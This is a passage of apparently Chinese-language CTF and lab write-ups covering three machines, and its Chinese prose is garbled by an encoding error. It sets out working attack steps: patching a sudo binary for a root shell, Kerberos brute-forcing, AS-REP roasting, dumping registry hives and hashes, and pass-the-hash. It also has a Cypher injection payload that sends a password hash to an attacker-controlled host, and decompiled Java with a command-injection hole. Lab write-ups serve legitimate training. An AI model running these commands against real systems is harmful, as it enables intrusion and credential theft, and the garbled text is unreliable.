secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser mash may run the following commands on predictable:\r(root) NOPASSWD: /opt/shell è¯•ç€è¿è¡Œä¸€ä¸‹\nmash@predictable:~$ sudo /opt/shell\rUso: ./shell input\rPista: ./shell -h\rmash@predictable:~$ sudo /opt/shell -h\rÂ¿Sabias que EI_VERSION puede tener diferentes valores?. radare2 esta instalado\rä½ çŸ¥é“EI_VERSIONå¯ä»¥æœ‰ä¸åŒçš„å€¼å—ï¼Ÿradare2å·²å®‰è£… ç»è¿‡æœç´¢ï¼ŒRadare2æ˜¯ä¸€ä¸ªé€†å‘å·¥å…·ï¼Œä»–çš„é¡¹ç›®åœ°å€ğŸ‘‡\nradareorg/radare2: UNIX-like reverse engineering framework and command-line toolset æ¥ä¸‹æ¥è¿›è¡Œåˆ†æè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶\n[0x000010a0]\u0026gt; aa\rINFO: Analyze all flags starting with sym. and entry0 (aa)\rINFO: Analyze imports (af@@@i)\rINFO: Analyze entrypoint (af@ entry0)\rINFO: Analyze symbols (af@@@s)\rINFO: Recovering variables\rINFO: Analyze all functions arguments/locals (afva@@@F)\r[0x000010a0]\u0026gt; afl\r0x00001030 1 6 sym.imp.puts\r0x00001040 1 6 sym.imp.fread\r0x00001050 1 6 sym.imp.system\r0x00001060 1 6 sym.imp.printf\r0x00001070 1 6 sym.imp.strcmp\r0x00001080 1 6 sym.imp.fseek\r0x00001090 1 6 sym.imp.fopen\r0x000010a0 1 37 entry0\r0x000012a0 1 13 sym._fini\r0x00001199 9 262 main\r0x00001000 3 27 sym._init\r0x00001190 5 60 entry.init0\r0x00001140 5 55 entry.fini0\r0x000010d0 4 34 fcn.000010d0\r[0x000010a0]\u0026gt; pdf @ main\r; DATA XREF from entry0 @ 0x10b8(r)\râ”Œ 262: int main (int argc, char **argv);\râ”‚ ; arg int argc @ rdi\râ”‚ ; arg char **argv @ rsi\râ”‚ ; var int64_t var_8h @ rbp-0x8\râ”‚ ; var int64_t var_10h @ rbp-0x10\râ”‚ ; var int64_t var_14h @ rbp-0x14\râ”‚ ; var int64_t var_20h @ rbp-0x20\râ”‚ 0x00001199 55 push rbp\râ”‚ 0x0000119a 4889e5 mov rbp, rsp\râ”‚ 0x0000119d 4883ec20 sub rsp, 0x20\râ”‚ 0x000011a1 897dec mov dword [var_14h], edi ; argc\râ”‚ 0x000011a4 488975e0 mov qword [var_20h], rsi ; argv\râ”‚ 0x000011a8 837dec02 cmp dword [var_14h], 2\râ”‚ â”Œâ”€\u0026lt; 0x000011ac 7423 je 0x11d1\râ”‚ â”‚ 0x000011ae 488d05530e.. lea rax, str.Uso:_._shell_input ; 0x2008 ; \u0026#34;Uso: ./shell input\u0026#34;\râ”‚ â”‚ 0x000011b5 4889c7 mov rdi, rax\râ”‚ â”‚ 0x000011b8 e873feffff call sym.imp.puts ; int puts(const char *s)\râ”‚ â”‚ 0x000011bd 488d05570e.. lea rax, str.Pista:_._shell__h ; 0x201b ; \u0026#34;Pista: ./shell -h\u0026#34;\râ”‚ â”‚ 0x000011c4 4889c7 mov rdi, rax\râ”‚ â”‚ 0x000011c7 e864feffff call sym.imp.puts ; int puts(const char *s)\râ”‚ â”Œâ”€â”€\u0026lt; 0x000011cc e9c7000000 jmp 0x1298\râ”‚ â”‚â””â”€\u0026gt; 0x000011d1 488b45e0 mov rax, qword [var_20h]\râ”‚ â”‚ 0x000011d5 4883c008 add rax, 8\râ”‚ â”‚ 0x000011d9 488b00 mov rax, qword [rax]\râ”‚ â”‚ 0x000011dc 4889c6 mov rsi, rax\râ”‚ â”‚ 0x000011df 488d05470e.. lea rax, [0x0000202d] ; \u0026#34;-h\u0026#34;\râ”‚ â”‚ 0x000011e6 4889c7 mov rdi, rax\râ”‚ â”‚ 0x000011e9 e882feffff call sym.imp.strcmp ; int strcmp(const char *s1, const char *s2)\râ”‚ â”‚ 0x000011ee 85c0 test eax, eax\râ”‚ â”‚â”Œâ”€\u0026lt; 0x000011f0 7514 jne 0x1206\râ”‚ â”‚â”‚ 0x000011f2 488d05370e.. lea rax, str.Sabias_que_EI_VERSION_puede_tener_diferentes_valores_._radare2_esta_instalado ; 0x2030\râ”‚ â”‚â”‚ 0x000011f9 4889c7 mov rdi, rax\râ”‚ â”‚â”‚ 0x000011fc e82ffeffff call sym.imp.puts ; int puts(const char *s)\râ”‚ â”Œâ”€â”€â”€\u0026lt; 0x00001201 e992000000 jmp 0x1298\râ”‚ â”‚â”‚â””â”€\u0026gt; 0x00001206 488d05730e.. lea rax, [0x00002080] ; \u0026#34;r\u0026#34;\râ”‚ â”‚â”‚ 0x0000120d 4889c6 mov rsi, rax\râ”‚ â”‚â”‚ 0x00001210 488d056b0e.. lea rax, str.shell ; 0x2082 ; \u0026#34;shell\u0026#34;\râ”‚ â”‚â”‚ 0x00001217 4889c7 mov rdi, rax\râ”‚ â”‚â”‚ 0x0000121a e871feffff call sym.imp.fopen ; file*fopen(const char *filename, const char *mode)\râ”‚ â”‚â”‚ 0x0000121f 488945f0 mov qword [var_10h], rax\râ”‚ â”‚â”‚ 0x00001223 488b45f0 mov rax, qword [var_10h]\râ”‚ â”‚â”‚ 0x00001227 ba00000000 mov edx, 0\râ”‚ â”‚â”‚ 0x0000122c be06000000 mov esi, 6\râ”‚ â”‚â”‚ 0x00001231 4889c7 mov rdi, rax\râ”‚ â”‚â”‚ 0x00001234 e847feffff call sym.imp.fseek ; int fseek(FILE *stream, long offset, int whence)\râ”‚ â”‚â”‚ 0x00001239 488b55f0 mov rdx, qword [var_10h]\râ”‚ â”‚â”‚ 0x0000123d 488b45f8 mov rax, qword [var_8h]\râ”‚ â”‚â”‚ 0x00001241 4889d1 mov rcx, rdx\râ”‚ â”‚â”‚ 0x00001244 ba01000000 mov edx, 1\râ”‚ â”‚â”‚ 0x00001249 be01000000 mov esi, 1\râ”‚ â”‚â”‚ 0x0000124e 4889c7 mov rdi, rax\râ”‚ â”‚â”‚ 0x00001251 e8eafdffff call sym.imp.fread ; size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)\râ”‚ â”‚â”‚ 0x00001256 488b45f8 mov rax, qword [var_8h]\râ”‚ â”‚â”‚ 0x0000125a 0fb600 movzx eax, byte [rax]\râ”‚ â”‚â”‚ 0x0000125d 3c01 cmp al, 1\râ”‚ â”‚â”‚â”Œâ”€\u0026lt; 0x0000125f 7423 je 0x1284\râ”‚ â”‚â”‚â”‚ 0x00001261 488b45e0 mov rax, qword [var_20h]\râ”‚ â”‚â”‚â”‚ 0x00001265 4883c008 add rax, 8\râ”‚ â”‚â”‚â”‚ 0x00001269 488b00 mov rax, qword [rax]\râ”‚ â”‚â”‚â”‚ 0x0000126c 0fb600 movzx eax, byte [rax]\râ”‚ â”‚â”‚â”‚ 0x0000126f 3c30 cmp al, 0x30 ; \u0026#39;0\u0026#39;\râ”‚ â”Œâ”€â”€â”€â”€\u0026lt; 0x00001271 7511 jne 0x1284\râ”‚ â”‚â”‚â”‚â”‚ 0x00001273 488d050e0e.. lea rax, str._bin_bash ; 0x2088 ; \u0026#34;/bin/bash\u0026#34;\râ”‚ â”‚â”‚â”‚â”‚ 0x0000127a 4889c7 mov rdi, rax\râ”‚ â”‚â”‚â”‚â”‚ 0x0000127d e8cefdffff call sym.imp.system ; int system(const char *string)\râ”‚ â”Œâ”€â”€â”€â”€â”€\u0026lt; 0x00001282 eb14 jmp 0x1298\râ”‚ â”‚â””â”€â”€â””â”€\u0026gt; 0x00001284 488d05070e.. lea rax, str.Bleh_n ; 0x2092 ; \u0026#34;Bleh~~\\n\u0026#34;\râ”‚ â”‚ â”‚â”‚ 0x0000128b 4889c7 mov rdi, rax\râ”‚ â”‚ â”‚â”‚ 0x0000128e b800000000 mov eax, 0\râ”‚ â”‚ â”‚â”‚ 0x00001293 e8c8fdffff call sym.imp.printf ; int printf(const char *format)\râ”‚ â”‚ â”‚â”‚ ; CODE XREFS from main @ 0x11cc(x), 0x1201(x), 0x1282(x)\râ”‚ â””â”€â””â””â”€â”€\u0026gt; 0x00001298 b800000000 mov eax, 0\râ”‚ 0x0000129d c9 leave\râ”” 0x0000129e c3 ret æ‰”ç»™Deepseekå¿«é€Ÿåˆ†æä¸€ä¸‹\nç¨‹åºå¤§æ¦‚åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†\nç¬¬ä¸€éƒ¨åˆ†\ræ¯”è¾ƒargv[1]å’Œâ€œ-hâ€æ˜¯å¦ç›¸ç­‰ã€‚å¦‚æœç›¸ç­‰ï¼Œå³strcmpè¿”å›0ï¼Œåˆ™è·³è½¬åˆ°æ‰“å°æç¤ºä¿¡æ¯ï¼Œç„¶åç›´æ¥é€€å‡ºã€‚å› æ­¤å¦‚æœç”¨æˆ·è¾“å…¥çš„æ˜¯â€œ-hâ€å‚æ•°ï¼Œå°±ä¼šæ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ï¼Œä¸ä¼šæ‰§è¡Œshellã€‚\ræ¥ä¸‹æ¥ï¼Œå¦‚æœå‚æ•°ä¸æ˜¯â€œ-hâ€ï¼Œç¨‹åºç»§ç»­æ‰§è¡Œï¼š\rç¬¬äºŒéƒ¨åˆ†\rç¨‹åºæ‰“å¼€äº†ä¸€ä¸ªåä¸º\u0026#34;shell\u0026#34;çš„æ–‡ä»¶ï¼Œè·³è½¬åˆ°ç¬¬6ä¸ªå­—èŠ‚çš„ä½ç½®ï¼ˆåç§»é‡6ï¼‰ï¼Œç„¶åè¯»å–1ä¸ªå­—èŠ‚åˆ°var_8hæŒ‡å‘çš„ä½ç½®ã€‚\rå¦‚æœè¿™ä¸ªå­—èŠ‚ä¸ç­‰äº1ï¼Œç¨‹åºç»§ç»­æ‰§è¡Œã€‚\rå¦‚æœè¯¥å­—ç¬¦æ˜¯\u0026#39;0\u0026#39;ï¼Œåˆ™æ‰§è¡Œsystem(\u0026#34;/bin/bash\u0026#34;)ï¼Œå¦åˆ™æ‰“å°Bleh~~ã€‚ æ€»ç»“ä¸€ä¸‹\nargcå¿…é¡»ä¸º2ï¼Œå³ç¨‹åºå¸¦ä¸€ä¸ªå‚æ•°ã€‚\nå‚æ•°ä¸èƒ½æ˜¯â€œ-hâ€ã€‚\nç¨‹åºä¼šæ‰“å¼€å½“å‰ç›®å½•ä¸‹çš„\u0026quot;shell\u0026quot;æ–‡ä»¶ï¼Œè¯»å–å…¶ç¬¬6ä¸ªå­—èŠ‚ï¼ˆåç§»é‡6ï¼‰çš„ä¸€ä¸ªå­—èŠ‚ï¼Œè¯¥å­—èŠ‚å¿…é¡»ä¸ç­‰äº1ã€‚\nåŒæ—¶ï¼Œä¼ å…¥çš„å‚æ•°çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¿…é¡»æ˜¯'0\u0026rsquo;ï¼ˆå³argv[1][0] == \u0026lsquo;0\u0026rsquo;ï¼‰ã€‚\nä½¿ç”¨r2è¿›è¡Œä¿®æ”¹\nmash@predictable:/opt$ r2 -w shell # -w is write mode\r[0x000010a0]\u0026gt; s 0x06 # jump to addr 0x06\r[0x00000006]\u0026gt; w 0 # overwrite 0\r[0x00000006]\u0026gt; q # save and exit Method 2 #\rç”±äºæˆ‘ä»¬æ˜¯å¯ä»¥ä¿®æ”¹**/opt/shell**çš„ï¼Œå› æ­¤å¯ä»¥ç›´æ¥å°†ææƒä»£ç è¿½åŠ åˆ°å…¶ä¸­ï¼Œè¿™åº”è¯¥ç®—æ˜¯ä½œè€…çš„ç–æ¼ï¼Ÿï¼Ÿï¼Ÿ\nSummary #\rUserï¼šç½‘é¡µæºç æ³„éœ²å‡ºéšæœºæ•°ç”Ÿæˆé€»è¾‘ï¼Œç”¨å¾—åˆ°çš„åºåˆ—è¿›è¡Œåæ¨ï¼Œå¾—åˆ°åŠ å¯†å‚æ•°ï¼Œè®¡ç®—å‡ºç¬¬ä¸€ç™¾ä¸ªæ•°å­—ï¼Œè¾“å…¥å¾—åˆ°ç™»å½•å‡­è¯ã€‚\nRootï¼šsshç™»å½•åå°±æ˜¯Pyjailï¼Œè¿‡æ»¤å…³é”®å­—å¯ä»¥ç”¨**+å·è¿›è¡Œæ‹¼æ¥ï¼Œä¹Ÿä¸æ˜¯å¾ˆä¸¥æ ¼ï¼Œç½‘ä¸Šå¯ä»¥éšä¾¿æ‰¾payload**ã€‚æŸ¥çœ‹åˆ°ç‰¹æ®Šæƒé™å‘½ä»¤ï¼Œéœ€è¦ä½¿ç”¨r2å·¥å…·åˆ†æmainå‡½æ•°çš„å…·ä½“åŠŸèƒ½ï¼Œä¿®æ”¹0x06ä¸Šçš„å­—èŠ‚å³å¯ç»•è¿‡ã€‚å› ä¸ºè¯¥äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯å¯å†™çš„ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ç›´æ¥æ·»åŠ ææƒå‘½ä»¤ã€‚\n","date":"2025-03-04","externalUrl":null,"permalink":"/posts/2025/03/dockerlabs-predictable/","section":"Posts","summary":"","title":"Dockerlabs-predictable","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium Nmap #\r[root@kali] /home/kali â¯ nmap 192.168.56.126 -sV -Pn -T4 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 18:44 CST\rNmap scan report for 192.168.56.126\rHost is up (0.00028s latency).\rNot shown: 989 filtered tcp ports (no-response)\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-03-02 23:47:04Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\rMAC Address: 08:00:27:4E:CF:21 (Oracle VirtualBox virtual NIC)\rService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 12.84 seconds æŠŠSOUPEDECODE.LOCALã€DC01.SOUPEDECODE.LOCALæ·»åŠ åˆ°**/etc/hosts**\nUserEnum #\rå°è¯•enum4linuxç»“æœä¸å…è®¸ç©ºåæšä¸¾\nå¹¶ä¸”åœ¨DC03ä¸­å°è¯•è¿‡çš„LLMNRä¸­æ¯’æ”»å‡»ä¹Ÿæ²¡æœ‰ä»»ä½•ååº”\nå› æ­¤åªèƒ½é€šè¿‡kerberosæ¥è¿›è¡Œç”¨æˆ·æšä¸¾\nropnop/kerbrute: A tool to perform Kerberos pre-auth bruteforcing ç”¨å¤–éƒ¨å­—å…¸æ‰«æåˆ°å››ä¸ªå­˜åœ¨çš„ç”¨æˆ·\nåˆ©ç”¨ç‚¹åº”è¯¥æ˜¯ä»charlieå…¥æ‰‹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¦åŒæ­¥æ—¶åŒºï¼ï¼ï¼ï¼ï¼\n[root@kali] /home/kali/DC02 â¯ ntpdate soupedecode.local å¾—åˆ°charlieçš„å¯†ç å°±æ˜¯charlie\nä½¿ç”¨crackmapexecè·å–åˆ°ç”¨æˆ·ååˆ—è¡¨\n[root@kali] /home/kali/DC02 â¯ crackmapexec smb 192.168.56.126 -u charlie -p charlie --rid-brute | grep SidTypeUser | sed \u0026#39;s/.*\\\\\\(.*\\)(.*/\\1/\u0026#39; \u0026gt; usernames.txt GetNPUsers #\ræŸ¥çœ‹å“ªäº›ç”¨æˆ·æ²¡æœ‰è®¾ç½®é¢„è®¤è¯\n[root@kali] /home/kali/DC02 â¯ impacket-GetNPUsers -usersfile usernames.txt -no-pass -dc-ip \u0026#34;192.168.56.126\u0026#34; soupedecode.local/ çˆ†ç ´å¾—åˆ°å¯†ç \nzximena448:internet Bloodhound #\rå°½ç®¡ç›®æ ‡æœºå™¨ä¸Šå¼€æ”¾äº†53ç«¯å£ï¼Œå­˜åœ¨DNSæœåŠ¡ï¼Œä½†æ˜¯å‘¢ç»è¿‡æµ‹è¯•æ˜¯ä¸å¯ç”¨çš„ã€‚\nå› æ­¤éœ€è¦åœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ªdnschefï¼Œä¼ªé€ DNSæœåŠ¡ï¼Œä¹Ÿå¯ä»¥å……å½“DNSæœåŠ¡å™¨ï¼Œç»•è¿‡è§£æ\n[root@kali] /home/kali â¯ dnschef --fakeip 192.168.56.126\r[root@kali] /home/kali/DC02 â¯ bloodhound-python -u \u0026#39;zximena448\u0026#39; -p \u0026#39;internet\u0026#39; -ns 127.0.0.1 -d SOUPEDECODE.LOCAL -dc DC01.SOUPEDECODE.LOCAL --zip å¯ä»¥çœ‹åˆ°å½“å‰çš„ZXIMENA448ç”¨æˆ·å±äºBackupOperatorsç»„\nè¿™åœ¨æˆ‘ä¹‹å‰å†™è¿‡çš„ä¸€ç¯‡æ–‡ç« ä¸­é‡åˆ°è¿‡ï¼šHTB-Blackfield - HYH\nå¯ä»¥å‚è€ƒçš„æ–‡ç« ğŸ‘‡\nBackup Operator Privilege Escalation \u0026lt; BorderGate ç°åœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ªsmbæœåŠ¡\n[root@kali] /tmp/shared â¯ impacket-smbserver -smb2support -ts -debug share /tmp/shared ç„¶åæå– SAM æ•°æ®\n[root@kali] /home/kali/DC02/backup_dc_registry (main) â¯ impacket-reg -dc-ip 192.168.56.126 SOUPEDECODE.LOCAL/zximena448:internet@192.168.56.126 backup -o \u0026#39;\\\\192.168.56.104\\share\u0026#39; ä¸‹é¢è¿™ä¸ªAdministratorçš„hashæ˜¯æ— æ³•ä½¿ç”¨çš„\n[root@kali] /tmp/shared â¯ impacket-secretsdump -system SYSTEM.save -sam SAM.save -security SECURITY.save LOCAL â\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6\r[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\rAdministrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\r[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn\u0026#39;t have hash information.\r[*] Dumping cached domain logon information (domain/username:hash)\r[*] Dumping LSA Secrets\r[*] $MACHINE.ACC $MACHINE.ACC:plain_password_hex:a2d41e766e263b6324dcbd7aff4b69b3c42e44658e119ba6a43eae3f1da750a7689e19b94127d12e63171960583effc488a64efc45fa83d296e9f3cbcdccdbc693a3724e303fc24a67a183fbb60e6b0a2bf3638e60dbf01ad0b84b6cde6ff73d4c2a8a6a4bcb3027e0ccd34f360309b1551c684a13e4aac89c65effd462c458305181e08af5911c50c537f8f3f7280297ef15b961a3150a4caa27284be9120f7f786454f7db8282311573011a2d3d753f969493522d2d4d76e513903b63767f7b393ef389616d4faba451a683231add72167785765816010fa65786306ec10dd2ce0fd50cc4db6b304e9a60562852f7f\r$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:3582a8b74d192bbeca8a23cd2022baae\r[*] DPAPI_SYSTEM dpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4\rdpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503\r[*] NL$KM 0000 44 C5 ED CE F5 0E BF 0C 15 63 8B 8D 2F A3 06 8F D........c../...\r0010 62 4D CA D9 55 20 44 41 75 55 3E 85 82 06 21 14 bM..U DAuU\u0026gt;...!.\r0020 8E FA A1 77 0A 9C 0D A4 9A 96 44 7C FC 89 63 91 ...w......D|..c.\r0030 69 02 53 95 1F ED 0E 77 B5 24 17 BE 6E 80 A9 91 i.S....w.$..n...\rNL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991\r[*] Cleaning up... ä½†æ˜¯è·å–åˆ°äº†æœºå™¨è´¦æˆ·çš„hash ($MACHINE.ACC)\nMachineAccountæ˜¯æ¯å°è®¡ç®—æœºåœ¨å®‰è£…ç³»ç»Ÿåé»˜è®¤ç”Ÿæˆçš„è®¡ç®—æœºå¸æˆ·\nPasswordSpray #\rè¿›è¡Œå¯†ç å–·æ´’ï¼Œå‘ç°è¿™ä¸ªhashæ˜¯DC01ç”¨æˆ·çš„\n[root@kali] /home/kali/DC02 â¯ crackmapexec smb 192.168.56.126 -u usernames.txt -H \u0026#39;3582a8b74d192bbeca8a23cd2022baae\u0026#39; â\rSMB 192.168.56.126 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)\rSMB 192.168.56.126 445 DC01 [-] SOUPEDECODE.LOCAL\\Administrator:3582a8b74d192bbeca8a23cd2022baae STATUS_LOGON_FAILURE SMB 192.168.56.126 445 DC01 [-] SOUPEDECODE.LOCAL\\Guest:3582a8b74d192bbeca8a23cd2022baae STATUS_LOGON_FAILURE SMB 192.168.56.126 445 DC01 [-] SOUPEDECODE.LOCAL\\krbtgt:3582a8b74d192bbeca8a23cd2022baae STATUS_LOGON_FAILURE SMB 192.168.56.126 445 DC01 [+] SOUPEDECODE.LOCAL\\DC01$:3582a8b74d192bbeca8a23cd2022baae å†æ¬¡è¿›è¡Œsecrets-dumpï¼ŒæŸ¥çœ‹æ˜¯å¦åœ¨DC01ä¸Šä¿å­˜æœ‰Adminçš„hash\n[root@kali] /home/kali/DC02 â¯ impacket-secretsdump SOUPEDECODE.LOCAL/\u0026#39;DC01$\u0026#39;@192.168.56.126 -hashes \u0026#39;aad3b435b51404eeaad3b435b51404ee:3582a8b74d192bbeca8a23cd2022baae\u0026#39; -target-ip 192.168.56.126 | grep Administrator â\rAdministrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::\rAdministrator:aes256-cts-hmac-sha1-96:01dc1e0f079f2dfe4a880156b7192acc658b8733cc87f1c5be32c291ad8e0318\rAdministrator:aes128-cts-hmac-sha1-96:4b4cf4064e92346339b1a3ef3ff65d6b\rAdministrator:des-cbc-md5:b0614357f8160ef4 æœ€åä½¿ç”¨Evil-winrmç™»å½•\nSummary #\rå…ˆé€šè¿‡kerbruteè¿›è¡Œç”¨æˆ·åçˆ†ç ´ï¼Œå†æ£€æŸ¥åˆ°äº†æ²¡æœ‰è®¾ç½®Kerberosé¢„è®¤è¯çš„ç”¨æˆ·ï¼Œæ³„éœ²å‡ºç”¨æˆ·å“ˆå¸Œï¼Œè·å–åˆ°ç”¨æˆ·zximena448ã€‚\nzximena448ç”¨æˆ·å±äºBackup Operatorsç»„ï¼Œå¯ä»¥åˆ©ç”¨å…¶æƒé™è·å–åˆ°SAMç­‰æ•°æ®æ–‡ä»¶ã€‚åˆ†æå¾—åˆ°åŸŸå†…é»˜è®¤æœºå™¨DC01çš„å¯†ç å“ˆå¸Œã€‚\næœ€ååœ¨DC01çš„æœºå™¨ä¸Šè¿›è¡Œå“ˆå¸Œæå–ï¼Œåº”è¯¥æ˜¯Administratorç™»é™†è¿‡DC01ï¼Œå› æ­¤æå–åˆ°äº†ä»–çš„å“ˆå¸Œå€¼ã€‚\n","date":"2025-03-03","externalUrl":null,"permalink":"/posts/2025/03/hackmyvm-dc02/","section":"Posts","summary":"","title":"HackMyVm-DC02","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Cypher â¯ nmap cypher.htb -sV -A -T4 PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)\r|_ 256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)\r80/tcp open http nginx 1.24.0 (Ubuntu)\r|_http-title: GRAPH ASM\r|_http-server-header: nginx/1.24.0 (Ubuntu) Dirsearch #\r[root@kali] /home/kali/Desktop â¯ dirsearch -u cypher.htb -t 50 -x 404\rTarget: http://cypher.htb/\rStarting: 200 - 5KB - /about 200 - 5KB - /about.html 307 - 0B - /api -\u0026gt; /api/docs 307 - 0B - /api/ -\u0026gt; http://cypher.htb/api/api 307 - 0B - /demo/ -\u0026gt; http://cypher.htb/api/demo 307 - 0B - /demo -\u0026gt; /login 200 - 4KB - /login.html 200 - 4KB - /login 301 - 178B - /testing -\u0026gt; http://cypher.htb/testing/ Task Completed Cypher Injection #\rè¿›å…¥ç™»å½•é¡µé¢ï¼Œå°è¯•è¿›è¡ŒSQLæ³¨å…¥ï¼Œå¾—åˆ°æŠ¥é”™å›æ˜¾\n{message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 60 (offset: 59))\r\u0026#34;MATCH (u:USER) -[:SECRET]-\u0026gt; (h:SHA1) WHERE u.name = \u0026#39;admin\u0026#39;\u0026#39; return h.value as hash\u0026#34;\r^} ä¼¼ä¹å­˜åœ¨ç€Cypheræ³¨å…¥ï¼Œä¸‹é¢æ˜¯ä¸€äº›æ–‡ç« \nFun with Cypher Injections - HackMD\nProtecting against Cypher Injection - Knowledge Base\nCypher Injection Cheat Sheet - Pentester Land\nè¿™é‡Œå°è¯•çš„æ˜¯SSRFå¤–å¸¦å‡ºadminç”¨æˆ·çš„hashå€¼\n{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#39; OR 1=1 LOAD CSV FROM \u0026#39;http://10.10.xx.xx/ppp=\u0026#39;+h.value AS y Return \u0026#39;\u0026#39;//\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;123\u0026#34;} 9f54ca4c130be6d529a56dee59dc2b2090e43acf ä¸å¹¸çš„æ˜¯ï¼Œè¿™ä¸ªå¹¶ä¸èƒ½è¢«ç ´è§£ã€‚ã€‚ã€‚ã€‚ã€‚è€Œä¸”æ›´æ¢ç”¨æˆ·ä¹Ÿæ˜¯ä¸€æ ·çš„hash\næŸ¥çœ‹ä¹‹å‰çš„åç¼–è¯‘\npackage com.cypher.neo4j.apoc;\rimport java.io.BufferedReader;\rimport java.io.InputStreamReader;\rimport java.util.Arrays;\rimport java.util.concurrent.TimeUnit;\rimport java.util.stream.Stream;\rimport org.neo4j.procedure.Description;\rimport org.neo4j.procedure.Mode;\rimport org.neo4j.procedure.Name;\rimport org.neo4j.procedure.Procedure;\r/* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions.class */\rpublic class CustomFunctions {\r@Procedure(name = \u0026#34;custom.getUrlStatusCode\u0026#34;, mode = Mode.READ)\r@Description(\u0026#34;Returns the HTTP status code for the given URL as a string\u0026#34;)\rpublic Stream\u0026lt;StringOutput\u0026gt; getUrlStatusCode(@Name(\u0026#34;url\u0026#34;) String url) throws Exception {\rif (!url.toLowerCase().startsWith(\u0026#34;http://\u0026#34;) \u0026amp;\u0026amp; !url.toLowerCase().startsWith(\u0026#34;https://\u0026#34;)) {\rurl = \u0026#34;https://\u0026#34; + url;\r}\rString[] command = {\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;curl -s -o /dev/null --connect-timeout 1 -w %{http_code} \u0026#34; + url};\rSystem.out.println(\u0026#34;Command: \u0026#34; + Arrays.toString(command));\rProcess process = Runtime.getRuntime().exec(command);\rBufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\rBufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));\rStringBuilder errorOutput = new StringBuilder();\rwhile (true) {\rString line = errorReader.readLine();\rif (line == null) {\rbreak;\r}\rerrorOutput.append(line).append(\u0026#34;\\n\u0026#34;);\r}\rString statusCode = inputReader.readLine();\rSystem.out.println(\u0026#34;Status code: \u0026#34; + statusCode);\rboolean exited = process.waitFor(10L, TimeUnit.SECONDS);\rif (!exited) {\rprocess.destroyForcibly();\rstatusCode = \u0026#34;0\u0026#34;;\rSystem.err.println(\u0026#34;Process timed out after 10 seconds\u0026#34;);\r} else {\rint exitCode = process.exitValue();\rif (exitCode != 0) {\rstatusCode = \u0026#34;0\u0026#34;;\rSystem.err.println(\u0026#34;Process exited with code \u0026#34; + exitCode);\r}\r}\rif (errorOutput.length() \u0026gt; 0) {\rSystem.err.println(\u0026#34;Error output:\\n\u0026#34; + errorOutput.toString());\r}\rreturn Stream.of(new StringOutput(statusCode));\r}\r/* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions$StringOutput.class */\rpublic static class StringOutput {\rpublic String statusCode;\rpublic StringOutput(String statusCode) {\rthis.statusCode = statusCode;\r}\r}\r} 